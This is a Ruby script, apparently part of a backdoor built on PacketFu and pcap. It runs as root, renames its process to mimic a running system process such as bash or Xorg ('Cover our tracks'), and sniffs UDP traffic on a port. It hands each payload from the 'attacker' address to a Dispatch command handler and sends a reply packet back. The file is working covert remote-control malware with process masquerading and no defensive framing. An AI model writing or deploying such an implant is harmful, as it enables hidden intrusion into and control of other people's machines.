#!/usr/bin/env ruby

require 'optparse'
require 'rubygems'
require 'pcaplet'
require '../lib/packetfu.rb'
require 'thread'
require './dispatch.rb'
include Pcap

# ---------------------------------------------------------
# Setup and gather options
# ---------------------------------------------------------

# Make sure we're running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

# Parse options
options = {}

optparse = OptionParser.new do |opts|
	opts.on('-h', '--help', "Command Help") do
		puts opts
		exit
	end
	# The device to communicate on
	opts.on('-d', '--device DEVICE', "Network device to listen on. Default first network device installed on host.") do |f|
		options[:dev] = f
	end
	# Optionally sepcifiy the nameserver to query
	opts.on('-p', '--port PORT', "Port to listen on. Default 8000.") do |f|
		options[:port] = f
	end
end

optparse.parse!

# Listening device
dev = options[:dev]? options[:dev] : Pcap.lookupdev
# Listening port
port = options[:port]? options[:port] : 8000

# ---------------------------------------------------------
# Cover our tracks
# ---------------------------------------------------------

# We'll choose a common process that is already running on the machine to mask this process with
# List in order of preference, as we'll choose the first one that is running on the machine. If none
# are found, the first process name will be used - list wisely.
covers = ['bash','mdworker','Xorg','kthreadd','gnome-terminal']

begin
	# Run top only once, Mac top uses -l, Linux uses -n
	top = (RUBY_PLATFORM.downcase.include?("darwin")) ? `top -l 1` : `top -n 1`;

	# If none of the processes are found running, we'll just go with the first one
	$0 = covers[0]

	# Is there a process running that we can mask ourselves with? Choose the first one we find.
	covers.each do |cover|
		if top.match cover
			# Change the process name
			$0 = cover
			break
		end
	end
rescue
	# If it fails, we'll just go with the first one
	$0 = covers[0]
end

# ---------------------------------------------------------
# Listen for attacker
# ---------------------------------------------------------

cap = Pcap::Capture.open_live(dev)
cap.setfilter('udp dst port ' + port.to_s)

cap.loop do |pkt|
	attacker_ip = pkt.ip_src.to_s;
	local_ip = pkt.ip_dst.to_s;

	p "Command receievd from " + attacker_ip
	p Dispatch.new pkt.udp_data.to_s

	cap.close

	udp_pkt = PacketFu::UDPPacket.new
	udp_pkt.udp_src = rand(0xffff - 1024) + 1024
	udp_pkt.udp_dst = port

	udp_pkt.ip_saddr = local_ip
	udp_pkt.ip_daddr = attacker_ip

	udp_pkt.recalc
	udp_pkt.to_w(dev)
end

# ---------------------------------------------------------
# Fin
# ---------------------------------------------------------
